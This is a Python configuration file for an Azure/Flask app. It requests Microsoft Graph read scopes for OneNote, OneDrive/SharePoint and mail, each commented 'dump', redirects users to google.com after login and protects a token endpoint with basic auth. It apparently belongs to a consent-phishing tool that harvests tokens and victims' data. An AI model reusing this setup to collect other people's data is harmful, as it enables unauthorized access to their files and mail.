from dotenv import load_dotenv
import os

load_dotenv()

# Application (client) ID of app registration
CLIENT_ID = os.getenv("CLIENT_ID")
# Application's generated client secret: never check this into source control!
CLIENT_SECRET = os.getenv("CLIENT_SECRET")

# AUTHORITY = "https://login.microsoftonline.com/common"  # For multi-tenant app
AUTHORITY = f"https://login.microsoftonline.com/{os.getenv('TENANT_ID', 'common')}"

REDIRECT_PATH = "/getAToken"  # Used for forming an absolute URL to your redirect URI.
REDIRECT_URI  = os.getenv("REDIRECT_URI") + REDIRECT_PATH
# The absolute URL must match the redirect URI you set
# in the app's registration in the Azure portal.

# client Redirection url

REDIRECT_URI_CLIENT = "https://google.com"

# You can find the proper permission names from this document
# https://docs.microsoft.com/en-us/graph/permissions-reference
# https://developer.microsoft.com/en-us/graph/graph-explorer
SCOPE = [
    "Notes.Read.All",          # oneNote               dump
    "Files.Read.All",          # oneDrive sharepoint   dump
    "Mail.ReadBasic.Shared",   # mail                  dump
    ]

# Tells the Flask-session extension to store sessions in the filesystem
SESSION_TYPE = "filesystem"
# Using the file system will not work in most production systems,
# it's better to use a database-backed session store instead.

EXTRACT_DIR = "data"
# /tokens credentials
BASIC_AUTH_USERNAME = os.getenv("BASIC_AUTH_USERNAME")
BASIC_AUTH_PASSWORD = os.getenv("BASIC_AUTH_PASSWORD")